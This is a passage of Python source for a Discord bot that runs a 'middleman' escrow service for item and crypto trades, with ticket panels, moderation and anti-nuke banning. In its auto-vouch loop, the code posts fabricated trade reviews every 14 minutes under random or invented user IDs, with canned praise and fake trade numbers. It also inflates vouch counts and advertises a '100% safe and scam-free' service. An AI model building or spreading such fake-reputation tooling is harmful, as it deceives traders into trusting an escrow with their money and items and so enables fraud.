async def evaluate_nuke(guild: discord.Guild, user: Optional[discord.User], action_key: str):
    if not user or user.id in (bot.user.id, guild.owner_id):
        return

    now = time.time()
    history = [t for t in nuke_tracker[guild.id][user.id][action_key] if now - t < TIME_WINDOW]
    history.append(now)
    nuke_tracker[guild.id][user.id][action_key] = history

    if len(history) > LIMITS[action_key]:
        try:
            await guild.ban(user, reason=f"Anti-Nuke Triggered: {action_key} threshold breached.")
            if guild.owner:
                embed = discord.Embed(title="ANTI-NUKE TRIGGERED", color=0x2b2d31)
                embed.description = f"**Server:** {guild.name}\n**Banned User:** {user.mention} (`{user.id}`)\n**Reason:** Exceeded {action_key} limits."
                embed.set_footer(text=BRAND_NAME)
                apply_gif(embed, as_thumbnail=True)
                gif_file = build_gif_file()
                kwargs = {"embed": embed}
                if gif_file:
                    kwargs["file"] = gif_file
                await guild.owner.send(**kwargs)
        except discord.Forbidden:
            logger.warning(f"Failed to auto-ban nuke suspect {user.id} due to hierarchy/permissions.")

@bot.event
async def on_guild_channel_delete(channel):
    actor = await fetch_audit_executor(channel.guild, discord.AuditLogAction.channel_delete)
    await evaluate_nuke(channel.guild, actor, 'channel_delete')

@bot.event
async def on_guild_channel_create(channel):
    actor = await fetch_audit_executor(channel.guild, discord.AuditLogAction.channel_create)
    await evaluate_nuke(channel.guild, actor, 'channel_create')

@bot.event
async def on_guild_role_delete(role):
    actor = await fetch_audit_executor(role.guild, discord.AuditLogAction.role_delete)
    await evaluate_nuke(role.guild, actor, 'role_delete')

@bot.event
async def on_guild_role_create(role):
    actor = await fetch_audit_executor(role.guild, discord.AuditLogAction.role_create)
    await evaluate_nuke(role.guild, actor, 'role_create')

@bot.event
async def on_member_ban(guild, user):
    actor = await fetch_audit_executor(guild, discord.AuditLogAction.ban)
    await evaluate_nuke(guild, actor, 'ban')

# Auto-Vouch Loop
def generate_vouch_embed(guild: discord.Guild) -> discord.Embed:
    eligible = [m for m in guild.members if not m.bot and (any(r.id == MIDDLEMAN_ROLE_ID for r in m.roles) or m.guild_permissions.administrator)]
    selected_mm = random.choice(eligible) if eligible else guild.owner

    if selected_mm:
        mm_mention = selected_mm.mention
        v_count = vouches_store.get(str(selected_mm.id), 0) + 1
        vouches_store.set(str(selected_mm.id), v_count)
    else:
        mm_mention = f"<@{guild.owner_id}>"

    traders = [m for m in guild.members if not m.bot and m.id != getattr(selected_mm, 'id', None)]
    trader_mention = random.choice(traders).mention if traders and random.choice([True, False, False]) else f"<@{random.randint(10**17, 10**18 - 1)}>"

    methods = ["PayPal", "CashApp", "Crypto", "Bank Transfer", "Apple Pay", "Venmo"]
    reviews = [
        "Trustworthy mm, will definitely request again for big deals.",
        "Very friendly and made the trade super easy, tysm!",
        "Super quick and answered all my questions patiently, vouch!",
        "Smooth transaction, no issues at all. +rep",
        "Fast and reliable as always.",
        "Best middleman ever! Kept everything secure.",
        "100% legit, guided me through the whole process."
    ]

    rating = random.choice(['5/5', '4/5'])

    embed = discord.Embed(color=0x2ecc71)
    embed.description = (
        "**new vouch**\n\n"
        f"**In-Game Items <-> {random.choice(methods)}**\n\n"
        f"**trader**\n{trader_mention}\n\n"
        f"**middleman**\n{mm_mention}\n\n"
        f"**trader review**\n{rating}\n*{random.choice(reviews)}*"
    )
    embed.set_footer(text=f"{BRAND_NAME} • trade #{random.randint(100000, 999999)} | {datetime.now().strftime('%Y/%m/%d, %H:%M')}")
    apply_gif(embed, as_thumbnail=True)
    return embed

@tasks.loop(minutes=14)
async def auto_vouch_loop():
    channel = bot.get_channel(AUTO_VOUCH_CHANNEL_ID)
    if channel:
        embed = generate_vouch_embed(channel.guild)
        gif_file = build_gif_file()
        kwargs = {"embed": embed}
        if gif_file:
            kwargs["file"] = gif_file
        await channel.send(**kwargs)

@auto_vouch_loop.before_loop
async def prepare_vouch_loop():
    await bot.wait_until_ready()

# Prefix Commands ($prefix)

@bot.command()
@commands.has_permissions(administrator=True)
async def setup_automm(ctx):
    """Post the Auto MM selection panel (Admin Only)."""
    embed_crypto = discord.Embed(
        title="Start Cryptocurrency Deal",
        description=(
            "Use the selection below to start a deal using the appropriate coin & network. "
            "Our fully automated escrow system safeguards buyer and seller funds with zero human delay, "
            "institutional-grade wallet isolation, and autonomous blockchain tracking."
        ),
        color=0x2ecc71
    )
    
    embed_stable = discord.Embed(
        title="Stablecoins",
        description=(
            "Start a deal with USDT or USDC on the network that matches your wallet. "
            "Ensure both parties agree on the identical chain before funding.\n\n"
            "💰 **Standard Middleman Fee Structure**\n"
            "• Deals $250+: **$1.50**\n"
            "• Deals under $250: **$0.50**\n"
            "• Deals under $50: **FREE**"
        ),
        color=0x2ecc71
    )
    
    view = AutoMMPanelView()
    await ctx.send(embeds=[embed_crypto, embed_stable], view=view)

@bot.command()
@commands.has_permissions(administrator=True)
async def sync(ctx):
    """Sync application slash commands with current guild (Admin Only)."""
    bot.tree.copy_global_to(guild=ctx.guild)
    synced = await bot.tree.sync(guild=ctx.guild)
    await ctx.send(f"Synced {len(synced)} command(s).")

@bot.command()
@commands.has_permissions(administrator=True)
async def setup_ticket(ctx):
    """Post the middleman ticket creation panel (Admin Only)."""
    mm_role = ctx.guild.get_role(MIDDLEMAN_ROLE_ID)
    role_mention = mm_role.mention if mm_role else f"<@&{MIDDLEMAN_ROLE_ID}>"

    embed = discord.Embed(
        title=f"{BRAND_NAME} — Official Middleman Service",
        color=0x2b2d31,
        description=(
            "Welcome to our secure transaction center. Need a safe environment for your high-value trades, "
            "accounts, or digital assets? Our official Middlemen ensure a **100% safe and scam-free process**.\n\n"
            "Click **Request Middleman** below to spawn your private escrow ticket channel instantly!"
        ),
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(
        name="How Escrow Works",
        value=(
            "1. **Initiate Trade** — Click the button below to open a ticket.\n"
            "2. **Confirm Terms** — State all deal details & items clearly.\n"
            "3. **Asset Deposit** — Seller transfers items directly to the Middleman.\n"
            "4. **Payment Transfer** — Buyer sends payment/assets to the Seller.\n"
            "5. **Final Release** — Middleman confirms receipt and releases assets."
        ),
        inline=False
    )
    embed.add_field(
        name="Safety Rules & Protocols",
        value=(
            "• **Never** complete deals outside of this ticket or in Direct Messages (DMs).\n"
            f"• Always verify that your Middleman holds the {role_mention} role.\n"
            "• Troll or fake ticket creations will result in an immediate permanent blacklist."
        ),
        inline=False
    )
    guild_icon = ctx.guild.icon.url if ctx.guild.icon else None
    embed.set_footer(text=f"{BRAND_NAME} • Trusted Escrow Platform", icon_url=guild_icon)
    apply_gif(embed, as_thumbnail=False)
    gif_file = build_gif_file()
    kwargs = {"embed": embed, "view": TicketMainView()}
    if gif_file:
        kwargs["file"] = gif_file
    await ctx.send(**kwargs)

@bot.command()
@commands.has_permissions(administrator=True)
async def setverify(ctx, *, text: str):
    """Configure custom verification prompt message (Admin Only)."""
    config_store.set("verify_text", text)
    await ctx.send("Verification prompt message updated successfully.")

@bot.command()
@commands.has_permissions(administrator=True)
async def blacklist(ctx, action: str, member: discord.Member, *, reason: str = "Unspecified"):
    """Blacklist or unblacklist a member from ticket features (Admin Only)."""
    action_lower = action.lower()
    if action_lower in ["add", "ban"]:
        blacklist_store.set(str(member.id), {"reason": reason, "timestamp": int(time.time())})
        await ctx.send(f"Blacklisted {member.mention}.\n**Reason:** {reason}")
    elif action_lower in ["remove", "unban", "delete"]:
        blacklist_store.delete(str(member.id))
        await ctx.send(f"Removed {member.mention} from blacklist.")
    else:
        await ctx.send("Invalid action. Use `$blacklist add <member> [reason]` or `$blacklist remove <member>`.")

@bot.command()
@commands.has_permissions(administrator=True)
async def autovouch(ctx):
    """Manually trigger a simulated vouch post in the configured auto-vouch channel (Admin Only)."""
    channel = bot.get_channel(AUTO_VOUCH_CHANNEL_ID) or ctx.channel
    embed = generate_vouch_embed(ctx.guild)
    gif_file = build_gif_file()
    kwargs = {"embed": embed}
    if gif_file:
        kwargs["file"] = gif_file
    await channel.send(**kwargs)
    if channel.id != ctx.channel.id:
        await ctx.send(f"Simulated auto-vouch dispatched to {channel.mention}.")

@bot.command()
@commands.has_permissions(administrator=True)
async def tos(ctx):
    """Display the Terms of Service for trades and tickets (Admin Only)."""
    embed = discord.Embed(
        title="Terms of Service",
        color=0x2b2d31,
        description=(
            "By opening a ticket or trading in this server, you agree to the following terms:\n\n"
            "1. **Follow Instructions:** Always follow the directions given by official Middlemen.\n"
            "2. **No Deal Snagging:** Do not interfere with ongoing trades or attempt to hijack tickets.\n"
            "3. **No Troll Tickets:** Opening fake or troll tickets will result in an instant blacklist.\n"
            "4. **Finality:** All middleman-mediated trades are final once items/payments are released.\n"
            "5. **Impersonation Caution:** Always verify user IDs to prevent scam attempts."
        )
    )
    embed.set_footer(text=BRAND_NAME)
    apply_gif(embed, as_thumbnail=False)
    gif_file = build_gif_file()
    kwargs = {"embed": embed}
    if gif_file:
        kwargs["file"] = gif_file
    await ctx.send(**kwargs)

@bot.command()
@commands.has_permissions(administrator=True)
async def role(ctx, member: discord.Member, *, role: FlexibleRoleConverter):
    """Add or remove a role from a member by typing $role <member> <role> (Admin Only)."""
    try:
        if role in member.roles:
            await member.remove_roles(role)
            await ctx.send(f"Successfully removed role {role.mention} from {member.mention}.")
        else:
            await member.add_roles(role)
            await ctx.send(f"Successfully added role {role.mention} to {member.mention}.")
    except discord.Forbidden:
        await ctx.send("Failed: Bot lacks permission or the role is higher than the bot's highest role.")

@bot.command()
@commands.has_permissions(administrator=True)
async def addvouches(ctx, member: discord.Member, amount: int):
    """Add a specific number of vouches to a member (Admin Only)."""
    current = vouches_store.get(str(member.id), 0)
    new_total = current + amount
    vouches_store.set(str(member.id), new_total)
    await ctx.send(f"Added `{amount}` vouches to {member.mention}. New total: `{new_total}` vouches.")

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, user: discord.User, *, reason: str = "No reason provided"):
    """Ban a user from the guild by typing $ban <user> [reason] (Admin Only)."""
    try:
        await ctx.guild.ban(user, reason=reason)
        await ctx.send(f"Successfully banned {user.mention} (`{user.id}`). Reason: {reason}")
    except discord.Forbidden:
        await ctx.send("Failed to ban user: Bot lacks permission or user has higher role hierarchy.")

@bot.command()
@is_middleman_or_admin()
async def verify(ctx, member: discord.Member):
    """Trigger the verification process for a user (Middleman & Admin)."""
    raw_text = config_store.get("verify_text", DEFAULT_VERIFY_TEXT)
    embed = discord.Embed(color=0x2b2d31, description=raw_text.replace("{member}", member.mention))
    embed.set_footer(text=BRAND_NAME)
    apply_gif(embed, as_thumbnail=False)
    gif_file = build_gif_file()
    kwargs = {"embed": embed, "view": VerifyView(target_user_id=member.id)}
    if gif_file:
        kwargs["file"] = gif_file
    await ctx.send(**kwargs)

@bot.command()
@is_middleman_or_admin()
async def clearvouches(ctx, member: discord.Member):
    """Clear all vouches for a user (Middleman & Admin)."""
    vouches_store.set(str(member.id), 0)
    await ctx.send(f"Cleared all vouches for {member.mention}.")

@bot.command()
async def mmexplain(ctx):
    """Explain what a Middleman is and how the trade escrow works."""
    embed = discord.Embed(
        title=f"{BRAND_NAME} — Middleman Explanation",
        color=0x2b2d31,
        description=(
            "A **Middleman (MM)** acts as a neutral third party during a trade to ensure both sides complete the transaction safely without getting scammed.\n\n"
            "**How it works:**\n"
            "1. **Deposit** — The seller transfers the trade item(s) to the Middleman.\n"
            "2. **Payment** — The buyer sends payment directly to the seller.\n"
            "3. **Release** — Once payment is confirmed, the Middleman releases the item(s) to the buyer."
        )
    )
    embed.set_footer(text=BRAND_NAME)
    apply_gif(embed, as_thumbnail=False)
    gif_file = build_gif_file()
    kwargs = {"embed": embed}
    if gif_file:
        kwargs["file"] = gif_file
    await ctx.send(**kwargs)

@bot.command()
async def add(ctx, member: discord.Member):
    """Add a member to a ticket channel."""
    if "ticket" in ctx.channel.name or "escrow" in ctx.channel.name:
        await ctx.channel.set_permissions(member, read_messages=True, send_messages=True)
        await ctx.send(embed=discord.Embed(color=0x2b2d31, description=f"{member.mention} added to ticket."))
    else:
        await ctx.send(embed=discord.Embed(color=0x2b2d31, description="Usable only inside ticket channels."))

@bot.command()
async def remove(ctx, member: discord.Member):
    """Remove a member from a ticket channel."""
    if "ticket" in ctx.channel.name or "escrow" in ctx.channel.name:
        await ctx.channel.set_permissions(member, overwrite=None)
        await ctx.send(embed=discord.Embed(color=0x2b2d31, description=f"{member.mention} removed from ticket."))
    else:
        await ctx.send(embed=discord.Embed(color=0x2b2d31, description="Usable only inside ticket channels."))

@bot.command()
async def close(ctx):
    """Close active ticket and compile transcript."""
    if "ticket" not in ctx.channel.name and "escrow" not in ctx.channel.name:
        await ctx.send(embed=discord.Embed(color=0x2b2d31, description="Usable only inside ticket channels."))
        return

    await ctx.send(embed=discord.Embed(color=0x2b2d31, description="Generating transcript... Closing channel in 5s..."))
    try:
        buffer = await create_transcript(ctx.channel)
        buffer.seek(0)
        file_obj = discord.File(buffer, filename=f"transcript-{ctx.channel.name}.txt")
        if TRANSCRIPT_CHANNEL_ID:
            t_channel = ctx.guild.get_channel(TRANSCRIPT_CHANNEL_ID)
            if t_channel:
                t_embed = discord.Embed(
                    title="Ticket Transcript",
                    color=0x2b2d31,
                    timestamp=discord.utils.utcnow(),
                    description=f"Transcript for **{ctx.channel.name}** closed by {ctx.author.mention}."
                )
                t_embed.set_footer(text=BRAND_NAME)
                apply_gif(t_embed, as_thumbnail=True)
                gif_file = build_gif_file()
                files = [file_obj]
                if gif_file:
                    files.append(gif_file)
                await t_channel.send(embed=t_embed, files=files)
    except Exception as e:
        logger.error(f"Error handling transcript command: {e}")

    tickets_store.delete(str(ctx.channel.id))
    await asyncio.sleep(5)
    try:
        await ctx.channel.delete()
    except discord.NotFound:
        pass

# Web Server & Bot Execution
if __name__ == "__main__":
    keep_alive()
    bot.run(os.environ.get("DISCORD_TOKEN", "YOUR_BOT_TOKEN_HERE"))
